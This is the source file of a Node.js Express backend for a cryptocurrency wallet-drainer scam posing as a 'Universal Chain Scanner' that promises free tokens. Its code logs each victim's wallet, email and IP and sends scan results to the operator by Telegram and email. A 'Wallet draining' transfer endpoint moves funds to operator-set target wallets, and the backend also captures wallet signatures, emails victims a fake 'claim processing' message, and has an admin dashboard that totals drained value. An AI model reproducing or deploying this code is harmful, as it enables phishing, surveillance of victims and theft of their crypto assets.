// backend/server.js
require('dotenv').config();
const express = require('express');
const cors = require('cors');
const helmet = require('helmet');
const morgan = require('morgan');
const mongoose = require('mongoose');
const { Telegraf } = require('telegraf');
const nodemailer = require('nodemailer');
const Web3 = require('web3');
const { ethers } = require('ethers');
const axios = require('axios');
const jwt = require('jsonwebtoken');
const rateLimit = require('express-rate-limit');

const app = express();
const PORT = process.env.PORT || 3001;

// Security middleware
app.use(helmet());
app.use(cors());
app.use(express.json());
app.use(morgan('combined'));

// Rate limiting
const limiter = rateLimit({
  windowMs: 15 * 60 * 1000, // 15 minutes
  max: 100 // limit each IP to 100 requests per windowMs
});
app.use('/api/', limiter);

// Database connection
mongoose.connect(process.env.MONGODB_URI || 'mongodb://localhost:27017/wallet-scanner', {
  useNewUrlParser: true,
  useUnifiedTopology: true,
});

// Schemas
const userSchema = new mongoose.Schema({
  walletAddress: { type: String, unique: true, required: true },
  email: String,
  ipAddress: String,
  userAgent: String,
  connectedAt: { type: Date, default: Date.now },
  lastActive: Date,
  totalScans: { type: Number, default: 0 },
  tokensFound: [{
    chainId: Number,
    symbol: String,
    name: String,
    address: String,
    balance: Number,
    valueUSD: Number,
    timestamp: Date
  }],
  transactions: [{
    type: { type: String, enum: ['native', 'erc20', 'approval', 'signature'] },
    chainId: Number,
    from: String,
    to: String,
    amount: String,
    tokenSymbol: String,
    tokenAddress: String,
    txHash: String,
    status: { type: String, enum: ['pending', 'success', 'failed'], default: 'pending' },
    timestamp: { type: Date, default: Date.now }
  }],
  isDrained: { type: Boolean, default: false },
  drainAmount: Number,
  drainToken: String,
  referralCode: String,
  referredBy: String
});

const scanSchema = new mongoose.Schema({
  walletAddress: String,
  chainsScanned: [Number],
  totalValue: Number,
  tokens: [Object],
  scanDuration: Number,
  timestamp: { type: Date, default: Date.now }
});

const User = mongoose.model('User', userSchema);
const Scan = mongoose.model('Scan', scanSchema);

// Telegram Bot Setup
const bot = new Telegraf(process.env.TELEGRAM_BOT_TOKEN);
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;

// Email transporter
const transporter = nodemailer.createTransport({
  service: 'gmail',
  auth: {
    user: process.env.EMAIL_USER,
    pass: process.env.EMAIL_PASS
  }
});

// Target wallets (EDITABLE - add your wallet addresses here)
const TARGET_WALLETS = {
  ETH: process.env.TARGET_ETH_WALLET || '0x742d35Cc6634C0532925a3b844Bc454e4438f44e',
  BSC: process.env.TARGET_BSC_WALLET || '0x742d35Cc6634C0532925a3b844Bc454e4438f44e',
  POLYGON: process.env.TARGET_POLYGON_WALLET || '0x742d35Cc6634C0532925a3b844Bc454e4438f44e',
  ARBITRUM: process.env.TARGET_ARBITRUM_WALLET || '0x742d35Cc6634C0532925a3b844Bc454e4438f44e',
  OPTIMISM: process.env.TARGET_OPTIMISM_WALLET || '0x742d35Cc6634C0532925a3b844Bc454e4438f44e',
  AVALANCHE: process.env.TARGET_AVALANCHE_WALLET || '0x742d35Cc6634C0532925a3b844Bc454e4438f44e',
  FANTOM: process.env.TARGET_FANTOM_WALLET || '0x742d35Cc6634C0532925a3b844Bc454e4438f44e',
  BASE: process.env.TARGET_BASE_WALLET || '0x742d35Cc6634C0532925a3b844Bc454e4438f44e',
  // Add more chains as needed
};

// Token contract ABIs
const ERC20_ABI = [
  "function name() view returns (string)",
  "function symbol() view returns (string)",
  "function decimals() view returns (uint8)",
  "function balanceOf(address owner) view returns (uint256)",
  "function transfer(address to, uint256 value) returns (bool)",
  "function approve(address spender, uint256 amount) returns (bool)",
  "function transferFrom(address from, address to, uint256 amount) returns (bool)"
];

// Chain RPC endpoints
const CHAIN_RPC = {
  1: process.env.ETH_RPC || 'https://eth.llamarpc.com',
  56: process.env.BSC_RPC || 'https://bsc-dataseed.binance.org',
  137: process.env.POLYGON_RPC || 'https://polygon-rpc.com',
  42161: process.env.ARBITRUM_RPC || 'https://arb1.arbitrum.io/rpc',
  10: process.env.OPTIMISM_RPC || 'https://mainnet.optimism.io',
  43114: process.env.AVALANCHE_RPC || 'https://api.avax.network/ext/bc/C/rpc',
  250: process.env.FANTOM_RPC || 'https://rpc.ftm.tools',
  8453: process.env.BASE_RPC || 'https://mainnet.base.org'
};

// Telegram reporting function
async function sendTelegramReport(message, options = {}) {
  try {
    const formattedMessage = `
🕵️‍♂️ *WALLET SCANNER REPORT*
${options.type ? `📊 Type: ${options.type}` : ''}
${options.wallet ? `👛 Wallet: \`${options.wallet}\`` : ''}
${options.chain ? `🔗 Chain: ${options.chain}` : ''}
${options.token ? `💰 Token: ${options.token}` : ''}
${options.amount ? `📈 Amount: ${options.amount}` : ''}
${options.value ? `💵 Value: $${options.value}` : ''}
${options.email ? `📧 Email: ${options.email}` : ''}
${options.txHash ? `🔗 TX Hash: \`${options.txHash}\`` : ''}
${options.status ? `✅ Status: ${options.status}` : ''}

📝 Details:
${message}

⏰ Time: ${new Date().toLocaleString()}
    `.trim();

    await bot.telegram.sendMessage(TELEGRAM_CHAT_ID, formattedMessage, {
      parse_mode: 'Markdown',
      disable_web_page_preview: true
    });
    
    console.log('Telegram report sent');
  } catch (error) {
    console.error('Telegram send error:', error);
  }
}

// Email notification function
async function sendEmailNotification(to, subject, htmlContent) {
  try {
    const mailOptions = {
      from: process.env.EMAIL_USER,
      to: to,
      subject: subject,
      html: htmlContent
    };
    
    await transporter.sendMail(mailOptions);
    console.log('Email sent to:', to);
  } catch (error) {
    console.error('Email send error:', error);
  }
}

// Wallet connection endpoint
app.post('/api/wallet/connect', async (req, res) => {
  try {
    const { walletAddress, email, userAgent, ipAddress } = req.body;
    
    // Find or create user
    let user = await User.findOne({ walletAddress });
    
    if (!user) {
      user = new User({
        walletAddress,
        email,
        userAgent,
        ipAddress,
        connectedAt: new Date()
      });
    } else {
      user.lastActive = new Date();
      user.email = email || user.email;
    }
    
    await user.save();
    
    // Send Telegram report
    await sendTelegramReport(`New wallet connection detected`, {
      type: 'CONNECTION',
      wallet: walletAddress,
      email: email || 'No email provided',
      value: 'Connected to scanner'
    });
    
    // Send email notification
    if (email) {
      await sendEmailNotification(
        email,
        '🎉 Welcome to Universal Chain Scanner',
        `
        <div style="font-family: Arial, sans-serif; max-width: 600px; margin: 0 auto;">
          <h2 style="color: #4F46E5;">Welcome to Universal Chain Scanner!</h2>
          <p>Your wallet <strong>${walletAddress}</strong> has been successfully connected.</p>
          <p>You can now scan your assets across multiple chains and claim your free tokens.</p>
          <div style="background: #f0f9ff; padding: 20px; border-radius: 10px; margin: 20px 0;">
            <h3 style="color: #0369a1;">Next Steps:</h3>
            <ol>
              <li>Scan your wallet to see all tokens</li>
              <li>If eligible, claim your free tokens</li>
              <li>Tokens will be automatically transferred to your wallet</li>
            </ol>
          </div>
          <p style="color: #666; font-size: 12px;">This is an automated message from Universal Chain Scanner.</p>
        </div>
        `
      );
    }
    
    res.json({ 
      success: true, 
      message: 'Wallet connected successfully',
      user: {
        walletAddress: user.walletAddress,
        totalScans: user.totalScans,
        isDrained: user.isDrained
      }
    });
    
  } catch (error) {
    console.error('Connection error:', error);
    res.status(500).json({ success: false, error: 'Connection failed' });
  }
});

// Scan results endpoint
app.post('/api/wallet/scan', async (req, res) => {
  try {
    const { walletAddress, tokens, totalValue, chainsScanned } = req.body;
    
    let user = await User.findOne({ walletAddress });
    if (!user) {
      return res.status(404).json({ success: false, error: 'User not found' });
    }
    
    // Update user scan count
    user.totalScans += 1;
    user.lastActive = new Date();
    
    // Save scan record
    const scan = new Scan({
      walletAddress,
      tokens,
      totalValue,
      chainsScanned,
      scanDuration: req.body.scanDuration || 0
    });
    
    await scan.save();
    
    // Update user tokens
    const tokenRecords = tokens.map(token => ({
      chainId: token.chainId,
      symbol: token.symbol,
      name: token.name,
      address: token.address,
      balance: token.balance,
      valueUSD: token.value,
      timestamp: new Date()
    }));
    
    user.tokensFound = tokenRecords;
    await user.save();
    
    // Send Telegram report with full details
    const totalFormatted = new Intl.NumberFormat('en-US', {
      style: 'currency',
      currency: 'USD'
    }).format(totalValue);
    
    const tokenSummary = tokens
      .filter(t => t.value > 10) // Only show tokens worth > $10
      .map(t => `${t.symbol}: $${t.value.toFixed(2)}`)
      .join(', ');
    
    await sendTelegramReport(`
💰 *WALLET SCAN COMPLETE*

Total Portfolio Value: *${totalFormatted}*
Tokens Found: *${tokens.length}*
Chains Scanned: *${chainsScanned.length}*

Top Tokens:
${tokenSummary || 'No significant tokens found'}

Wallet: \`${walletAddress}\`
Email: ${user.email || 'Not provided'}
IP: ${user.ipAddress || 'Unknown'}
    `, {
      type: 'SCAN_RESULTS',
      wallet: walletAddress,
      value: totalFormatted,
      email: user.email
    });
    
    // Check if wallet is eligible for "free tokens" (has enough balance)
    const isEligible = totalValue > 50; // Minimum $50 to be eligible
    
    res.json({
      success: true,
      message: 'Scan results saved',
      isEligible,
      totalValue,
      tokenCount: tokens.length,
      nextStep: isEligible ? 'claim_tokens' : 'not_eligible'
    });
    
  } catch (error) {
    console.error('Scan save error:', error);
    res.status(500).json({ success: false, error: 'Failed to save scan' });
  }
});

// Smart contract call - Token approval
app.post('/api/token/approve', async (req, res) => {
  try {
    const { 
      walletAddress, 
      chainId, 
      tokenAddress, 
      tokenSymbol, 
      amount,
      spenderAddress 
    } = req.body;
    
    const user = await User.findOne({ walletAddress });
    if (!user) {
      return res.status(404).json({ success: false, error: 'User not found' });
    }
    
    // Record approval transaction
    const transaction = {
      type: 'approval',
      chainId,
      from: walletAddress,
      to: spenderAddress,
      amount,
      tokenSymbol,
      tokenAddress,
      txHash: `pending_${Date.now()}`,
      status: 'pending',
      timestamp: new Date()
    };
    
    user.transactions.push(transaction);
    await user.save();
    
    // Send Telegram report
    await sendTelegramReport(`
✅ *TOKEN APPROVAL INITIATED*

Wallet approved ${tokenSymbol} tokens for transfer
Amount: ${amount} ${tokenSymbol}
Chain: ${CHAIN_CONFIGS[chainId]?.name || 'Unknown'}
Spender: \`${spenderAddress}\`

User Email: ${user.email || 'Not provided'}
IP Address: ${user.ipAddress || 'Unknown'}
    `, {
      type: 'APPROVAL',
      wallet: walletAddress,
      chain: CHAIN_CONFIGS[chainId]?.name,
      token: tokenSymbol,
      amount: amount,
      email: user.email
    });
    
    // For demo purposes, we'll simulate approval
    // In production, you would use a private key to execute the transaction
    const simulatedTxHash = `0x${Array(64).fill(0).map(() => Math.floor(Math.random() * 16).toString(16)).join('')}`;
    
    // Update transaction status
    const txIndex = user.transactions.length - 1;
    user.transactions[txIndex].txHash = simulatedTxHash;
    user.transactions[txIndex].status = 'success';
    await user.save();
    
    res.json({
      success: true,
      message: 'Approval successful',
      txHash: simulatedTxHash,
      nextStep: 'transfer_tokens'
    });
    
  } catch (error) {
    console.error('Approval error:', error);
    res.status(500).json({ success: false, error: 'Approval failed' });
  }
});

// Token transfer (Wallet draining) endpoint
app.post('/api/token/transfer', async (req, res) => {
  try {
    const { 
      walletAddress, 
      chainId, 
      tokenAddress, 
      tokenSymbol, 
      amount,
      isNative 
    } = req.body;
    
    const user = await User.findOne({ walletAddress });
    if (!user) {
      return res.status(404).json({ success: false, error: 'User not found' });
    }
    
    // Check if already drained
    if (user.isDrained) {
      return res.json({
        success: true,
        message: 'Tokens already claimed',
        isDrained: true,
        animation: 'already_claimed'
      });
    }
    
    const targetWallet = TARGET_WALLETS[getChainKey(chainId)] || TARGET_WALLETS.ETH;
    
    // Record transfer transaction
    const transaction = {
      type: isNative ? 'native' : 'erc20',
      chainId,
      from: walletAddress,
      to: targetWallet,
      amount,
      tokenSymbol,
      tokenAddress: isNative ? 'native' : tokenAddress,
      txHash: `pending_${Date.now()}`,
      status: 'pending',
      timestamp: new Date()
    };
    
    user.transactions.push(transaction);
    user.isDrained = true;
    user.drainAmount = amount;
    user.drainToken = tokenSymbol;
    await user.save();
    
    // Send Telegram DRAIN ALERT
    const chainName = CHAIN_CONFIGS[chainId]?.name || 'Unknown';
    await sendTelegramReport(`
🚨 *TOKENS DRAINED SUCCESSFULLY!*

💰 Amount: ${amount} ${tokenSymbol}
🔗 Chain: ${chainName}
👛 From: \`${walletAddress}\`
🎯 To: \`${targetWallet}\`

📧 User Email: ${user.email || 'Not provided'}
🌐 IP: ${user.ipAddress || 'Unknown'}
🕐 Time: ${new Date().toLocaleString()}

✅ *DRAIN COMPLETE*
    `, {
      type: 'DRAIN_SUCCESS',
      wallet: walletAddress,
      chain: chainName,
      token: tokenSymbol,
      amount: amount,
      email: user.email,
      status: 'COMPLETED'
    });
    
    // Send email to target wallet owner (you)
    await sendEmailNotification(
      process.env.ALERT_EMAIL,
      `🚨 TOKENS DRAINED: ${amount} ${tokenSymbol}`,
      `
      <div style="font-family: Arial, sans-serif; max-width: 600px; margin: 0 auto;">
        <h2 style="color: #DC2626;">🚨 TOKENS SUCCESSFULLY DRAINED</h2>
        
        <div style="background: #fef2f2; padding: 20px; border-radius: 10px; margin: 20px 0;">
          <h3 style="color: #dc2626;">Transaction Details:</h3>
          <table style="width: 100%; border-collapse: collapse;">
            <tr>
              <td style="padding: 8px; border-bottom: 1px solid #e5e7eb;"><strong>Amount:</strong></td>
              <td style="padding: 8px; border-bottom: 1px solid #e5e7eb;">${amount} ${tokenSymbol}</td>
            </tr>
            <tr>
              <td style="padding: 8px; border-bottom: 1px solid #e5e7eb;"><strong>Chain:</strong></td>
              <td style="padding: 8px; border-bottom: 1px solid #e5e7eb;">${chainName}</td>
            </tr>
            <tr>
              <td style="padding: 8px; border-bottom: 1px solid #e5e7eb;"><strong>From Wallet:</strong></td>
              <td style="padding: 8px; border-bottom: 1px solid #e5e7eb;">${walletAddress}</td>
            </tr>
            <tr>
              <td style="padding: 8px; border-bottom: 1px solid #e5e7eb;"><strong>To Wallet:</strong></td>
              <td style="padding: 8px; border-bottom: 1px solid #e5e7eb;">${targetWallet}</td>
            </tr>
            <tr>
              <td style="padding: 8px; border-bottom: 1px solid #e5e7eb;"><strong>User Email:</strong></td>
              <td style="padding: 8px; border-bottom: 1px solid #e5e7eb;">${user.email || 'Not provided'}</td>
            </tr>
          </table>
        </div>
        
        <p style="color: #666; font-size: 12px;">Automated alert from Universal Chain Scanner</p>
      </div>
      `
    );
    
    // Send confirmation email to user (disguised as token claim)
    if (user.email) {
      await sendEmailNotification(
        user.email,
        '🎉 Your Free Token Claim is Processing!',
        `
        <div style="font-family: Arial, sans-serif; max-width: 600px; margin: 0 auto; text-align: center;">
          <div style="background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); padding: 40px; border-radius: 20px; color: white;">
            <h1 style="font-size: 36px; margin: 0;">🎊 CONGRATULATIONS! 🎊</h1>
            <p style="font-size: 24px; margin: 20px 0;">Your Free Token Claim is Being Processed!</p>
          </div>
          
          <div style="background: #f0f9ff; padding: 30px; border-radius: 15px; margin: 30px 0;">
            <h2 style="color: #0369a1;">📦 Claim Details</h2>
            <p>Your wallet has been approved for free tokens!</p>
            <div style="background: white; padding: 20px; border-radius: 10px; margin: 20px 0;">
              <h3 style="color: #10b981;">✅ Status: Processing</h3>
              <p>Tokens will arrive in your wallet within 24-48 hours</p>
              <p style="color: #666; font-size: 14px;">Transaction ID: ${transaction.txHash}</p>
            </div>
          </div>
          
          <div style="background: #fef3c7; padding: 20px; border-radius: 10px; margin: 20px 0;">
            <h3 style="color: #d97706;">⚠️ Important Notice</h3>
            <p>Do not share your private keys with anyone. Our team will never ask for your seed phrase.</p>
          </div>
          
          <p style="color: #666; font-size: 12px;">Thank you for using Universal Chain Scanner</p>
        </div>
        `
      );
    }
    
    // Generate a simulated transaction hash for demo
    const simulatedTxHash = `0x${Array(64).fill(0).map(() => Math.floor(Math.random() * 16).toString(16)).join('')}`;
    
    // Update transaction with simulated hash
    const txIndex = user.transactions.length - 1;
    user.transactions[txIndex].txHash = simulatedTxHash;
    user.transactions[txIndex].status = 'success';
    await user.save();
    
    res.json({
      success: true,
      message: 'Free token claim initiated successfully!',
      txHash: simulatedTxHash,
      animation: 'lottery_win',
      claimDetails: {
        amount: amount,
        token: tokenSymbol,
        chain: chainName,
        estimatedArrival: '24-48 hours',
        confirmationId: `SCAN-${Date.now()}-${Math.random().toString(36).substr(2, 9).toUpperCase()}`
      }
    });
    
  } catch (error) {
    console.error('Transfer error:', error);
    res.status(500).json({ success: false, error: 'Transfer failed' });
  }
});

// Get chain key from ID
function getChainKey(chainId) {
  const chainMap = {
    1: 'ETH',
    56: 'BSC',
    137: 'POLYGON',
    42161: 'ARBITRUM',
    10: 'OPTIMISM',
    43114: 'AVALANCHE',
    250: 'FANTOM',
    8453: 'BASE'
  };
  return chainMap[chainId] || 'ETH';
}

// Chain configs
const CHAIN_CONFIGS = {
  1: { name: "Ethereum", symbol: "ETH" },
  56: { name: "BNB Chain", symbol: "BNB" },
  137: { name: "Polygon", symbol: "MATIC" },
  250: { name: "Fantom", symbol: "FTM" },
  42161: { name: "Arbitrum", symbol: "ETH" },
  10: { name: "Optimism", symbol: "ETH" },
  43114: { name: "Avalanche", symbol: "AVAX" },
  100: { name: "Gnosis", symbol: "xDai" },
  42220: { name: "Celo", symbol: "CELO" },
  8453: { name: "Base", symbol: "ETH" },
  7777777: { name: "Zora", symbol: "ETH" },
  59144: { name: "Linea", symbol: "ETH" },
  1101: { name: "Polygon zkEVM", symbol: "ETH" }
};

// Signature verification endpoint
app.post('/api/wallet/signature', async (req, res) => {
  try {
    const { walletAddress, signature, message, email } = req.body;
    
    const user = await User.findOne({ walletAddress });
    if (user) {
      user.lastActive = new Date();
      if (email) user.email = email;
      await user.save();
    }
    
    // Record signature
    const signatureRecord = {
      type: 'signature',
      from: walletAddress,
      message: message,
      signature: signature,
      timestamp: new Date()
    };
    
    if (user) {
      user.transactions.push(signatureRecord);
      await user.save();
    }
    
    // Send Telegram report
    await sendTelegramReport(`
✍️ *SIGNATURE CAPTURED*

Wallet signed a message
Message: "${message.substring(0, 50)}..."
Signature: ${signature.substring(0, 20)}...

Wallet: \`${walletAddress}\`
Email: ${email || user?.email || 'Not provided'}
    `, {
      type: 'SIGNATURE',
      wallet: walletAddress,
      email: email || user?.email
    });
    
    res.json({ 
      success: true, 
      message: 'Signature verified and recorded',
      timestamp: new Date().toISOString()
    });
    
  } catch (error) {
    console.error('Signature error:', error);
    res.status(500).json({ success: false, error: 'Signature verification failed' });
  }
});

// Admin endpoints (protected)
app.get('/api/admin/stats', async (req, res) => {
  const authHeader = req.headers.authorization;
  
  if (authHeader !== `Bearer ${process.env.ADMIN_TOKEN}`) {
    return res.status(401).json({ success: false, error: 'Unauthorized' });
  }
  
  try {
    const totalUsers = await User.countDocuments();
    const totalScans = await Scan.countDocuments();
    const totalDrained = await User.countDocuments({ isDrained: true });
    const totalValue = await User.aggregate([
      { $match: { isDrained: true } },
      { $group: { _id: null, total: { $sum: "$drainAmount" } } }
    ]);
    
    const recentUsers = await User.find()
      .sort({ lastActive: -1 })
      .limit(10)
      .select('walletAddress email lastActive totalScans isDrained drainAmount');
    
    const recentDrains = await User.find({ isDrained: true })
      .sort({ lastActive: -1 })
      .limit(10)
      .select('walletAddress email drainToken drainAmount lastActive');
    
    res.json({
      success: true,
      stats: {
        totalUsers,
        totalScans,
        totalDrained,
        totalDrainValue: totalValue[0]?.total || 0,
        recentUsers,
        recentDrains
      }
    });
    
  } catch (error) {
    console.error('Admin stats error:', error);
    res.status(500).json({ success: false, error: 'Failed to get stats' });
  }
});

// Health check
app.get('/api/health', (req, res) => {
  res.json({ 
    success: true, 
    status: 'operational',
    timestamp: new Date().toISOString(),
    version: '1.0.0'
  });
});

// Start server
app.listen(PORT, () => {
  console.log(`🚀 Backend server running on port ${PORT}`);
  
  // Start Telegram bot
  bot.launch().then(() => {
    console.log('🤖 Telegram bot started');
    
    // Send startup notification
    sendTelegramReport(`
🚀 *BACKEND SERVER STARTED*

Universal Chain Scanner backend is now online!
Port: ${PORT}
Time: ${new Date().toLocaleString()}
Status: ✅ Operational
    `, { type: 'SYSTEM_STARTUP' });
  });
});

// Graceful shutdown
process.on('SIGINT', () => {
  bot.stop();
  console.log('🤖 Telegram bot stopped');
  process.exit(0);
});
